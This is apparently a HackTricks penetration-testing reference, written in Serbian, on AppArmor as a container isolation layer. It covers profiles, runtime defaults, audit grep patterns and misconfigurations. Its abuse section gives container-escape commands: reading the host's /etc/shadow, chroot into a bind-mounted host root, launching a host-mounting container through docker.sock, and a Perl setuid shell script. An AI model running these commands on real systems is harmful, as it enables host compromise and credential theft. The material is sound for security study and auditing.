# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

AppArmor je sistem **Mandatory Access Control** koji primenjuje ograničenja putem profila po programu. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva po korisniku i grupi, AppArmor omogućava kernelu da sprovodi politiku vezanu za sam proces. U okruženjima sa containerima ovo je važno zato što workload može imati dovoljno tradicionalnih privilegija да pokuša neku akciju, a ipak biti odbijen zato što njegov AppArmor profil ne dozvoljava odgovarajući path, mount, network behavior, ili korišćenje capability.

Najvažnija konceptualna tačka je da je AppArmor **path-based**. On razmatra pristup filesystem-u kroz pravila zasnovana na path-ovima umesto kroz label-e kao što to radi SELinux. To ga čini pristupačnim i moćnim, ali isto tako znači da bind mounts i alternativne raspodele path-ova zaslužuju pažnju. Ako isti sadržaj host-a postane dostupan pod drugačijim path-om, efekat politike možda neće biti onakav kakav je operator prvobitno očekivao.

## Uloga u izolaciji kontejnera

Pregledi bezbednosti kontejnera često se zaustave na capabilities i seccomp, ali AppArmor ostaje važan i posle tih provera. Zamislite container koji ima više privilegija nego što bi trebao, ili workload kojem je iz operativnih razloga trebala još jedna capability. AppArmor i dalje može da ograniči pristup fajlovima, ponašanje mount-a, networking i obrasce izvršavanja na načine koji zaustavljaju očigledan abuse path. Zato isključivanje AppArmor-a "just to get the application working" može tiho pretvoriti konfiguraciju koja je bila samo rizična u onu koja je aktivno exploitable.

## Lab

Da biste proverili da li je AppArmor aktivan na hostu, koristite:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Da biste videli pod kojim korisnikom radi trenutni proces u kontejneru:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Razlika je poučna. U normalnom slučaju, proces bi trebalo da prikaže AppArmor kontekst vezan za profil koji je runtime odabrao. U slučaju unconfined, taj dodatni sloj ograničenja nestaje.

Takođe možete proveriti šta Docker misli da je primenio:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Korišćenje u runtime-u

Docker može primeniti podrazumevani ili prilagođeni AppArmor profil kada host to podržava. Podman se takođe može integrisati sa AppArmor na sistemima zasnovanim na AppArmor, iako na distribucijama koje imaju SELinux kao primarni MAC sistem često on preuzme glavnu ulogu. Kubernetes može izložiti AppArmor politiku na nivou workload-a na čvorovima koji zaista podržavaju AppArmor. LXC i srodna Ubuntu-family system-container okruženja takođe široko koriste AppArmor.

Praktično, AppArmor nije "Docker feature". To je host-kernel funkcionalnost koju mogu primeniti različiti runtimes. Ako host ne podržava AppArmor ili je runtime pokrenut kao unconfined, navodna zaštita zapravo ne postoji.

Za Kubernetes posebno, moderan API je `securityContext.appArmorProfile`. Od Kubernetes `v1.30`, starije beta AppArmor anotacije su zastarele. Na hostovima koji podržavaju AppArmor, `RuntimeDefault` je podrazumevani profil, dok `Localhost` pokazuje na profil koji mora već biti učitan na čvoru. Ovo je važno pri reviziji jer manifest može izgledati AppArmor-svestan dok u stvari u potpunosti zavisi od podrške i prethodno učitanih profila na čvoru.

Jedan suptilan ali koristan operativni detalj je da eksplicitno postavljanje `appArmorProfile.type: RuntimeDefault` strože nego jednostavno izostavljanje tog polja. Ako je polje eksplicitno postavljeno i čvor ne podržava AppArmor, admission bi trebao da ne uspe. Ako je polje izostavljeno, workload i dalje može da se pokrene na čvoru bez AppArmor i jednostavno neće dobiti taj dodatni sloj ograničenja. Iz ugla napadača, to je dobar razlog da se provere i manifest i stvarno stanje čvora.

Na hostovima sa podrškom za Docker i AppArmor, najpoznatiji podrazumevani profil je `docker-default`. Taj profil se generiše iz Moby-jevog AppArmor templata i važan je jer objašnjava zašto neki PoC-ovi zasnovani na capabilities i dalje ne uspevaju u podrazumevanom containeru. U širokim crtama, `docker-default` dopušta običan networking, zabranjuje pisanja u veliki deo `/proc`, zabranjuje pristup osetljivim delovima `/sys`, blokira mount operacije i ograničava ptrace tako da nije opšti primitiv za ispitivanje hosta. Razumevanje te osnovne postavke pomaže da se razlikuje "kontejner ima `CAP_SYS_ADMIN`" od "kontejner zapravo može iskoristiti tu capability protiv kernel interfejsa koji su mi bitni".

## Upravljanje profilima

AppArmor profili se obično čuvaju u `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je da se kose crte u putanji izvršnog fajla zamene tačkama. Na primer, profil za `/usr/bin/man` se često čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je bitan i za odbranu i za procenu jer kada jednom znate ime aktivnog profila, često brzo možete pronaći odgovarajući fajl na hostu.

Korисни host-side management команде укључују:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Razlog zašto su ove komande bitne u referenci o bezbednosti kontejnera je što objašnjavaju kako se profili zapravo kreiraju, učitavaju, prebacuju u complain mode, i menjaju nakon izmena aplikacije. Ako operator ima običaj da tokom otklanjanja problema prebaci profile u complain mode i zaboravi da vrati enforcement, kontejner može u dokumentaciji delovati zaštićeno, dok u stvarnosti radi mnogo labavije.

### Izgradnja i ažuriranje profila

`aa-genprof` može da posmatra ponašanje aplikacije i interaktivno pomogne pri generisanju profila:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` može generisati šablon profila koji se kasnije može učitati pomoću `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kada se binarni fajl promeni i politika treba da se ažurira, `aa-logprof` može da reprodukuje odbijanja zabeležena u logovima i pomogne operateru da odluči da li da ih dozvoli ili odbije:
```bash
sudo aa-logprof
```
### Logovi

Odbijanja od strane AppArmor-a često su vidljiva kroz `auditd`, syslog, ili alate kao što je `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ovo je korisno operativno i ofanzivno. Odbrambeni timovi ga koriste da usavrše profile. Napadači ga koriste da otkriju koji tačan put ili operacija se odbija i da li je AppArmor kontrola koja blokira lanac exploita.

### Identifikacija tačne datoteke profila

Kada runtime prikaže konkretno ime AppArmor profila za container, često je korisno mapirati to ime nazad na datoteku profila na disku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ovo je posebno korisno tokom pregleda na hostu jer premošćava jaz između „kontejner kaže da radi pod profilom `lowpriv`“ i „stvarna pravila se nalaze u ovom konkretnom fajlu koji može biti revidiran ili ponovo učitan“.

### Pravila visokog značaja za reviziju

Kada možete pročitati profil, ne zaustavljajte se na prostim `deny` linijama. Nekoliko tipova pravila u značajnoj meri menja koliko će AppArmor biti efikasan protiv pokušaja container escape:

- `ux` / `Ux`: izvršava ciljanu binarnu datoteku bez ograničenja. Ako je pod `ux` dozvoljen dostupan helper, shell ili interpreter, to je obično prva stvar koju treba testirati.
- `px` / `Px` i `cx` / `Cx`: izvršavaju prelaze profila on exec. Ovo nije automatski loše, ali vredi ih revidirati zato što prelaz može dospeti u znatno širi profil nego trenutni.
- `change_profile`: dozvoljava zadatku da se prebaci u drugi učitani profil, odmah ili pri sledećem exec. Ako je odredišni profil slabiji, ovo može postati predviđeni izlaz iz restriktivnog domena.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: ovo treba da promeni koliko poverenja imate u profil. `complain` beleži odbijanja umesto da ih sprovodi, `unconfined` uklanja granicu, a `prompt` zavisi od userspace odluke umesto od striktne kernel-nametnute zabrane.
- `userns` or `userns create,`: novija AppArmor politika može posredovati u kreiranju user namespaces. Ako kontejner profil eksplicitno to dozvoljava, ugnježdeni user namespaces ostaju u igri čak i kada platforma koristi AppArmor kao deo svoje hardening strategije.

Korisne host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Ovakva vrsta audita često je korisnija nego zurenje u stotine običnih pravila za fajlove. Ako breakout zavisi od izvršavanja helpera, ulaska u novi namespace, ili bekstva u manje restriktivan profil, odgovor je često sakriven u pravilima usmerenim na tranzicije umesto u očiglednim linijama tipa `deny /etc/shadow r`.

## Pogrešne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori to često uključe dok otklanjaju greške u aplikaciji koja je propala jer ju je profil ispravno blokirao zbog nečeg opasnog ili neočekivanog. Ako zastavica ostane u produkciji, čitav MAC sloj je efektivno uklonjen.

Drugi suptilni problem je pretpostavka da su bind mounts bezopasni zato što prava fajlova izgledaju normalno. Pošto je AppArmor path-based, izlaganje host putanja pod alternativnim mount lokacijama može loše da se preklopi sa pravilima za putanje. Treća greška je zaborav da ime profila u konfiguracionom fajlu znači vrlo malo ako host kernel zapravo ne sprovodi AppArmor.

## Zloupotreba

Kada AppArmor nije prisutan, operacije koje su ranije bile ograničene mogu odjednom početi da rade: čitanje osetljivih putanja preko bind mounts, pristup delovima procfs ili sysfs koji su trebali ostati teže dostupni, izvršavanje radnji povezanih sa mount-ovanjem ako capabilities/seccomp to takođe dozvoljavaju, ili korišćenje putanja koje bi profil inače odbio. AppArmor često objašnjava zašto pokušaj breakout-a zasnovan na capabilities "na papiru treba da radi", a ipak u praksi zakaže. Uklonite AppArmor i isti pokušaj može početi da uspeva.

Ako sumnjate da je AppArmor glavni uzrok koji sprečava path-traversal, bind-mount, ili mount-based lanac zloupotrebe, prvi korak je obično da uporedite šta postaje dostupno sa i bez profila. Na primer, ako je host path mount-ovan unutar containera, počnite tako što ćete proveriti da li možete da mu pristupite i da ga pročitate:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova je proveriti da li AppArmor predstavlja kontrolu koja blokira mount operacije ili pristup osetljivim kernel datotečnim sistemima:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
U okruženjima gde je host path već dostupan kroz bind mount, gubitak AppArmor-a može takođe pretvoriti read-only information-disclosure issue u direktan host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Poenta ovih komandi nije da AppArmor sam po sebi stvara breakout. Radi se o tome da, kada se AppArmor ukloni, mnogi filesystem i mount-based putevi zloupotrebe postanu odmah testabilni.

### Potpun primer: AppArmor onemogućen + host root montiran

Ako kontejner već ima host root bind-mounted na `/host`, uklanjanje AppArmor-a može pretvoriti blokiran filesystem abuse path u kompletan host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Kada se shell izvršava kroz host filesystem, workload je efektivno pobegao iz container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Potpun primer: AppArmor onemogućen + Runtime Socket

Ako je stvarna barijera bio AppArmor oko runtime state, montiran socket može biti dovoljan za potpun escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tačan put zavisi od mount point-a, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, i runtime API može pokrenuti container koji kompromituje host.

### Potpun primer: Path-Based Bind-Mount Bypass

Zato što je AppArmor zasnovan na putanjama, zaštita `/proc/**` ne štiti automatski isti procfs sadržaj hosta kada mu se pristupi kroz drugačiji put:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Uticaj zavisi od toga šta je tačno montirano i da li alternativni put takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najočiglednijih razloga zašto AppArmor mora biti ocenjen zajedno sa rasporedom montiranja umesto izolovano.

### Potpun primer: Shebang Bypass

AppArmor politika ponekad cilja putanju interpretera na način koji ne uzima u potpunosti u obzir izvršavanje skripti kroz rukovanje shebang-om. Istorijski primer uključivao je korišćenje skripte čija prva linija ukazuje na ograničeni interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ovakav primer je važan podsetnik da se namera profila i stvarna semantika izvršavanja mogu razići. Prilikom pregleda AppArmor-a u container okruženjima, interpreter chains i alternate execution paths zaslužuju posebnu pažnju.

## Provere

Cilj ovih provera je brzo odgovoriti na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen, i da li je runtime zaista primenio profil na ovaj container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Zanimljivo ovde:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, radno opterećenje ne koristi AppArmor izolaciju.
- Ako `aa-status` prikazuje AppArmor disabled ili not loaded, bilo koji naziv profila u runtime konfiguraciji je uglavnom kozmetički.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani custom profile, to je često razlog zašto filesystem- ili mount-bazirana putanja zloupotrebe funkcioniše.
- Ako `/sys/kernel/security/apparmor/profiles` ne sadrži profil koji ste očekivali, runtime ili konfiguracija orkestratora sama po sebi nije dovoljna.
- Ako navodno ojačani profil sadrži `ux`, široka pravila `change_profile`, `userns`, ili `flags=(complain)` tipa, praktična granica može biti mnogo slabija nego što ime profila sugeriše.

Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor uključenim često pravi razliku između kontrolisanog izuzetka i mnogo šire bezbednosne propasti.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućeno na hostovima koji podržavaju AppArmor | Koristi `docker-default` AppArmor profil osim ako nije prebrisano | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisno od hosta | AppArmor se podržava preko `--security-opt`, ali tačan podrazumevani izbor zavisi od hosta/runtime-a i manje je univerzalan nego Docker-ov dokumentovani `docker-default` profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije specificiran, podrazumevano je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućен na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
| containerd / CRI-O under Kubernetes | Sledi podršku čvora/runtime-a | Uobičajeni runtime-i podržani pod Kubernetes-om podržavaju AppArmor, ali stvarno sprovođenje i dalje zavisi od podrške čvora i podešavanja radnog opterećenja | Isto kao u Kubernetes redu; direktna runtime konfiguracija takođe može potpuno preskočiti AppArmor |

Za AppArmor, najvažnija varijabla je često **host**, ne samo runtime. Podešavanje profila u manifestu ne stvara izolaciju na čvoru gde AppArmor nije omogućen.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
